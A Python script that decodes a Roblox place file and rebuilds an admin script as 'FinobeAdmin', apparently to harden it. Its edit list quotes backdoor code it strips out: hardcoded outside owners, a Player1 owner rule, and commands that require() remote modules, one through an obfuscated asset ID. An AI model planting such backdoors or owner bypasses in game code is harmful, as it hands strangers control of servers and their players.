#!/usr/bin/env python3
import collections
import struct
import subprocess
import sys
import tempfile
from xml.sax.saxutils import escape

import lz4.block

ROOT_NAME = 'thugshakers admin'
CONTENT = {'AnimationId', 'BottomImage', 'MidImage', 'TopImage', 'Image', 'HoverImage', 'PressedImage',
           'MeshId', 'SoundId', 'Texture', 'TextureId', 'LinkedSource', 'Graphic', 'CursorIcon',
           'ShirtTemplate', 'PantsTemplate'}
SKIP = {'Tags', 'ScriptGuid', 'AttributesSerialize', 'CollisionGroups', 'MaterialColors', 'SmoothGrid', 'TextSize'}
FONT_SIZES = [8, 9, 10, 11, 12, 14, 18, 24, 28, 32, 36, 42, 48, 60, 96]
OLD_FONTS = 7

ADMIN_EDITS = [
    ('[\'Owners\'] = {"thugshaker", "trypozz", "rot5", "Mainnex"};', "['Owners'] = {FINOBE_OWNERS};"),
    ('[\'BanList\'] = {"Josh"};', "['BanList'] = {};"),
    ("['ChangedSettingsStick'] = true;", "['ChangedSettingsStick'] = false;"),
    ("Pcall(function() if game.CreatorId<=0 then table.insert(set['Owners'],'Player1') end end)\n", ''),
    ("or plr.userId==game.CreatorId then return true end", "then return true end"),
    ("""	set.MakeCommand('Executes Undetected V2 for the target player.',3,set.Prefix,{'f3x','f3x'},{'player'},1,function(plr,args)
		local plrz = set.GetPlayers(plr, args[1])
		for i, v in pairs(plrz) do
			require(4869378421).F3X(v.Name)
		end
	end)
""", ''),
    ("""		set.MakeCommand('Executes Undetected V2 for the target player.',3,set.Prefix,{'knife','k'},{'player'},1,function(plr,args)
			local plrz = set.GetPlayers(plr, args[1])
			for i, v in pairs(plrz) do
				require(15038853313).grab(v.Name)

			end
		end)
""", ''),
    ("""		set.MakeCommand('Executes Undetected V2 for the target player.',3,set.Prefix,{'car','c'},{'player'},1,function(plr,args)
			local plrz = set.GetPlayers(plr, args[1])
			for i, v in pairs(plrz) do
				require(4745872847).load(v.Name)
			end
		end)
		set.MakeCommand('Executes Undetected V2 for the target player.',3,set.Prefix,{'gyat','g'},{'player'},1,function(plr,args)
			local plrz = set.GetPlayers(plr, args[1])
			for i, v in pairs(plrz) do
				require(((2491062855 + 9928346) * 2) + 0.5).undetected(v.Name)
			end
		end)
""", ''),
    ("""	elseif cmd==set.RemoteServerKey..'AdminChat' then 
		for i,v""", """	elseif cmd==set.RemoteServerKey..'AdminChat' then 
		if not set.CheckAdmin(p,false) then return end
		for i,v"""),
    ("""		if set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end""",
     """		if type(a)=='string' and not a:find('Remote') and not a:find('Key') and a~='BanList' and a~='PlayerLogs' and set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end"""),
    ('set.Message("Thugshaker has given you shit",', 'set.Message("Finobe Admin",'),
    ('set.Hint("thugshakers epic script "..set', 'set.Hint("Finobe Admin! Chat "..set'),
]

HTTP_INTERFACE = """local HttpInterface = script.Parent
HttpInterface.GetAsync.OnServerInvoke = function() return false end
HttpInterface.PostAsync.OnServerInvoke = function() return false end
HttpInterface.Test.OnServerInvoke = function() return false end
"""


def chunks(data):
    pos = 32
    while pos < len(data):
        name = data[pos:pos + 4]
        clen, ulen = struct.unpack_from('<II', data, pos + 4)
        pos += 16
        if clen:
            body = lz4.block.decompress(data[pos:pos + clen], uncompressed_size=ulen)
            pos += clen
        else:
            body = data[pos:pos + ulen]
            pos += ulen
        yield name, body
        if name == b'END\0':
            break


def planes(b, n, width):
    return [int.from_bytes(bytes(b[k * n + i] for k in range(width)), 'big') for i in range(n)]


def zigzag(v):
    return (v >> 1) ^ -(v & 1)


def ints(b, n):
    return [zigzag(v) for v in planes(b, n, 4)]


def floats(b, n):
    out = []
    for v in planes(b, n, 4):
        v = ((v >> 1) | ((v & 1) << 31)) & 0xFFFFFFFF
        out.append(struct.unpack('<f', struct.pack('<I', v))[0])
    return out


def refs(b, n):
    acc, out = 0, []
    for v in ints(b, n):
        acc += v
        out.append(acc)
    return out


ROTATIONS = {
    0x02: (1, 0, 0, 0, 1, 0, 0, 0, 1), 0x03: (1, 0, 0, 0, 0, -1, 0, 1, 0), 0x05: (1, 0, 0, 0, -1, 0, 0, 0, -1),
    0x06: (1, 0, 0, 0, 0, 1, 0, -1, 0), 0x07: (0, 1, 0, 1, 0, 0, 0, 0, -1), 0x09: (0, 0, 1, 1, 0, 0, 0, 1, 0),
    0x0a: (0, -1, 0, 1, 0, 0, 0, 0, 1), 0x0c: (0, 0, -1, 1, 0, 0, 0, -1, 0), 0x0d: (0, 1, 0, 0, 0, 1, 1, 0, 0),
    0x0e: (0, 0, -1, 0, 1, 0, 1, 0, 0), 0x10: (0, -1, 0, 0, 0, -1, 1, 0, 0), 0x11: (0, 0, 1, 0, -1, 0, 1, 0, 0),
    0x14: (-1, 0, 0, 0, 1, 0, 0, 0, -1), 0x15: (-1, 0, 0, 0, 0, 1, 0, 1, 0), 0x17: (-1, 0, 0, 0, -1, 0, 0, 0, 1),
    0x18: (-1, 0, 0, 0, 0, -1, 0, -1, 0), 0x19: (0, 1, 0, -1, 0, 0, 0, 0, 1), 0x1b: (0, 0, -1, -1, 0, 0, 0, 1, 0),
    0x1c: (0, -1, 0, -1, 0, 0, 0, 0, -1), 0x1e: (0, 0, 1, -1, 0, 0, 0, -1, 0), 0x1f: (0, 1, 0, 0, 0, -1, -1, 0, 0),
    0x20: (0, 0, 1, 0, 1, 0, -1, 0, 0), 0x22: (0, -1, 0, 0, 0, 1, -1, 0, 0), 0x23: (0, 0, -1, 0, -1, 0, -1, 0, 0),
}


def decode_prop(t, b, n):
    if t == 1:
        out, p = [], 0
        for _ in range(n):
            ln = struct.unpack_from('<I', b, p)[0]
            out.append(('string', bytes(b[p + 4:p + 4 + ln])))
            p += 4 + ln
        return out
    if t == 2:
        return [('bool', bool(b[i])) for i in range(n)]
    if t == 3:
        return [('int', v) for v in ints(b, n)]
    if t == 4:
        return [('float', v) for v in floats(b, n)]
    if t == 5:
        return [('double', struct.unpack_from('<d', b, 8 * i)[0]) for i in range(n)]
    if t == 7:
        sx, sy = floats(b, n), floats(b[4 * n:], n)
        ox, oy = ints(b[8 * n:], n), ints(b[12 * n:], n)
        return [('UDim2', (sx[i], ox[i], sy[i], oy[i])) for i in range(n)]
    if t == 12:
        r, g, bl = floats(b, n), floats(b[4 * n:], n), floats(b[8 * n:], n)
        return [('Color3', (r[i], g[i], bl[i])) for i in range(n)]
    if t == 13:
        x, y = floats(b, n), floats(b[4 * n:], n)
        return [('Vector2', (x[i], y[i])) for i in range(n)]
    if t == 14:
        x, y, z = floats(b, n), floats(b[4 * n:], n), floats(b[8 * n:], n)
        return [('Vector3', (x[i], y[i], z[i])) for i in range(n)]
    if t == 16:
        rots, p = [], 0
        for _ in range(n):
            rid = b[p]
            p += 1
            if rid == 0:
                rots.append(struct.unpack_from('<9f', b, p))
                p += 36
            else:
                rots.append(ROTATIONS.get(rid, ROTATIONS[0x02]))
        x, y, z = floats(b[p:], n), floats(b[p + 4 * n:], n), floats(b[p + 8 * n:], n)
        return [('CoordinateFrame', (x[i], y[i], z[i]) + tuple(rots[i])) for i in range(n)]
    if t == 18:
        return [('token', v) for v in planes(b, n, 4)]
    if t == 19:
        return [('Ref', v) for v in refs(b, n)]
    if t == 24:
        a = [floats(b[k * 4 * n:], n) for k in range(4)]
        return [('Rect2D', tuple(a[k][i] for k in range(4))) for i in range(n)]
    if t == 27:
        return [('int64', zigzag(v)) for v in planes(b, n, 8)]
    return None


def load(path):
    data = open(path, 'rb').read()
    classes, insts, parent = {}, {}, {}
    for name, body in chunks(data):
        if name == b'INST':
            cid, ln = struct.unpack_from('<II', body, 0)
            cname = body[8:8 + ln].decode()
            p = 8 + ln
            cnt = struct.unpack_from('<I', body, p + 1)[0]
            ids = refs(body[p + 5:p + 5 + 4 * cnt], cnt)
            classes[cid] = ids
            for i in ids:
                insts[i] = {'class': cname, 'props': {}}
        elif name == b'PROP':
            cid, ln = struct.unpack_from('<II', body, 0)
            pname = body[8:8 + ln].decode()
            t = body[8 + ln]
            ids = classes[cid]
            values = decode_prop(t, body[9 + ln:], len(ids))
            if values is None:
                continue
            for i, v in zip(ids, values):
                insts[i]['props'][pname] = v
        elif name == b'PRNT':
            cnt = struct.unpack_from('<I', body, 1)[0]
            ch = refs(body[5:5 + 4 * cnt], cnt)
            pa = refs(body[5 + 4 * cnt:5 + 8 * cnt], cnt)
            parent.update(zip(ch, pa))
    children = collections.defaultdict(list)
    for i in sorted(insts):
        children[parent.get(i, -1)].append(i)
    return insts, children


def strip_comments(src):
    out, i, n = [], 0, len(src)
    while i < n:
        c = src[i]
        if c == '-' and src.startswith('--', i):
            j = i + 2
            if src[j:j + 1] == '[':
                k = j + 1
                while src[k:k + 1] == '=':
                    k += 1
                if src[k:k + 1] == '[':
                    close = ']' + '=' * (k - j - 1) + ']'
                    end = src.find(close, k + 1)
                    end = n if end < 0 else end + len(close)
                    out.append('\n' * src.count('\n', i, end))
                    i = end
                    continue
            end = src.find('\n', i)
            i = n if end < 0 else end
            continue
        if c in '"\'':
            j = i + 1
            while j < n and src[j] != c:
                j += 2 if src[j] == '\\' else 1
            out.append(src[i:j + 1])
            i = j + 1
            continue
        if c == '[':
            k = i + 1
            while src[k:k + 1] == '=':
                k += 1
            if src[k:k + 1] == '[':
                close = ']' + '=' * (k - i - 1) + ']'
                end = src.find(close, k + 1)
                end = n if end < 0 else end + len(close)
                out.append(src[i:end])
                i = end
                continue
        out.append(c)
        i += 1
    lines = [line.rstrip() for line in ''.join(out).split('\n')]
    return '\n'.join(line for line in lines if line.strip()) + '\n'


def compiles(src):
    with tempfile.NamedTemporaryFile('wb', suffix='.lua') as f:
        f.write(src)
        f.flush()
        return subprocess.run(['luac5.1', '-p', f.name], capture_output=True).returncode == 0


def clean_source(src, name):
    text = src.decode('utf-8', 'surrogateescape')
    stripped = strip_comments(text)
    before, after = compiles(src), compiles(stripped.encode('utf-8', 'surrogateescape'))
    if before and not after:
        raise SystemExit(f'stripping comments broke {name}')
    return stripped.encode('utf-8', 'surrogateescape')


def num(v):
    return repr(float(v)) if isinstance(v, float) else str(v)


def text(b):
    s = b.decode('utf-8', 'replace')
    return escape(''.join(ch if ch in '\t\n\r' or ord(ch) >= 32 else f'&#{ord(ch)};' for ch in s))


def font_size(size):
    best = 0
    for idx, value in enumerate(FONT_SIZES):
        if value <= size:
            best = idx
    return best


def prop_xml(name, kind, v, refids):
    if kind == 'string':
        if name == 'Source':
            return f'<ProtectedString name="Source"><![CDATA[{v.decode("utf-8", "surrogateescape").replace("]]>", "]]]]><![CDATA[>")}]]></ProtectedString>'
        if name in CONTENT:
            url = text(v)
            return f'<Content name="{name}"><url>{url}</url></Content>' if url else f'<Content name="{name}"><null></null></Content>'
        return f'<string name="{name}">{text(v)}</string>'
    if kind == 'bool':
        return f'<bool name="{name}">{"true" if v else "false"}</bool>'
    if kind in ('int', 'float', 'double', 'int64'):
        return f'<{kind} name="{name}">{num(v)}</{kind}>'
    if kind == 'token':
        if name == 'Font' and v >= OLD_FONTS:
            v = 3
        return f'<token name="{name}">{v}</token>'
    if kind == 'UDim2':
        return f'<UDim2 name="{name}"><XS>{num(v[0])}</XS><XO>{v[1]}</XO><YS>{num(v[2])}</YS><YO>{v[3]}</YO></UDim2>'
    if kind == 'Color3':
        r, g, b = (max(0, min(255, round(c * 255))) for c in v)
        return f'<Color3 name="{name}">{0xFF000000 | (r << 16) | (g << 8) | b}</Color3>'
    if kind == 'Vector2':
        return f'<Vector2 name="{name}"><X>{num(v[0])}</X><Y>{num(v[1])}</Y></Vector2>'
    if kind == 'Vector3':
        return f'<Vector3 name="{name}"><X>{num(v[0])}</X><Y>{num(v[1])}</Y><Z>{num(v[2])}</Z></Vector3>'
    if kind == 'CoordinateFrame':
        keys = ['X', 'Y', 'Z', 'R00', 'R01', 'R02', 'R10', 'R11', 'R12', 'R20', 'R21', 'R22']
        return f'<CoordinateFrame name="{name}">' + ''.join(f'<{k}>{num(x)}</{k}>' for k, x in zip(keys, v)) + '</CoordinateFrame>'
    if kind == 'Ref':
        return f'<Ref name="{name}">{refids.get(v, "null")}</Ref>'
    if kind == 'Rect2D':
        return f'<Rect2D name="{name}"><min><X>{num(v[0])}</X><Y>{num(v[1])}</Y></min><max><X>{num(v[2])}</X><Y>{num(v[3])}</Y></max></Rect2D>'
    return ''


def build(path):
    insts, children = load(path)
    roots = [i for i in children[0] + children[-1] if insts[i]['props'].get('Name', ('', b''))[1] == ROOT_NAME.encode()]
    if not roots:
        roots = [i for i, v in insts.items() if v['props'].get('Name', ('', b''))[1] == ROOT_NAME.encode()]
    root = roots[0]
    order, stack = [], [root]
    while stack:
        i = stack.pop()
        order.append(i)
        stack.extend(reversed(children[i]))
    refids = {i: f'RBX{k}' for k, i in enumerate(order)}

    source = insts[root]['props']['Source'][1].decode('utf-8', 'surrogateescape')
    for old, new in ADMIN_EDITS:
        if source.count(old) != 1:
            raise SystemExit(f'admin script changed, could not find: {old[:60]!r}')
        source = source.replace(old, new)
    insts[root]['props']['Source'] = ('string', source.encode('utf-8', 'surrogateescape'))
    insts[root]['props']['Name'] = ('string', b'FinobeAdmin')

    for i in order:
        if insts[i]['props'].get('Name', ('', b''))[1] == b'HttpInterfaceScript':
            insts[i]['props']['Source'] = ('string', HTTP_INTERFACE.encode())

    for i in order:
        src = insts[i]['props'].get('Source')
        if src:
            insts[i]['props']['Source'] = ('string', clean_source(src[1], insts[i]['props']['Name'][1].decode()))

    lines = ['<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">']

    def emit(i):
        v = insts[i]
        lines.append(f'<Item class="{v["class"]}" referent="{refids[i]}"><Properties>')
        props = v['props']
        for name in sorted(props):
            if name in SKIP:
                continue
            kind, value = props[name]
            lines.append(prop_xml(name, kind, value, refids))
        if 'TextSize' in props and 'FontSize' not in props:
            lines.append(f'<token name="FontSize">{font_size(props["TextSize"][1])}</token>')
        lines.append('</Properties>')
        for c in children[i]:
            emit(c)
        lines.append('</Item>')

    sys.setrecursionlimit(10000)
    emit(root)
    lines.append('</roblox>')
    return '\n'.join(lines) + '\n'


def main(argv):
    if len(argv) != 2:
        print('usage: build_admin.py place.rbxl out.rbxmx')
        return 2
    xml = build(argv[0])
    if xml.count('FINOBE_OWNERS') != 1:
        raise SystemExit('owner placeholder missing')
    open(argv[1], 'w', encoding='utf-8', errors='surrogateescape').write(xml)
    print(f'wrote {argv[1]} ({len(xml)} bytes)')
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
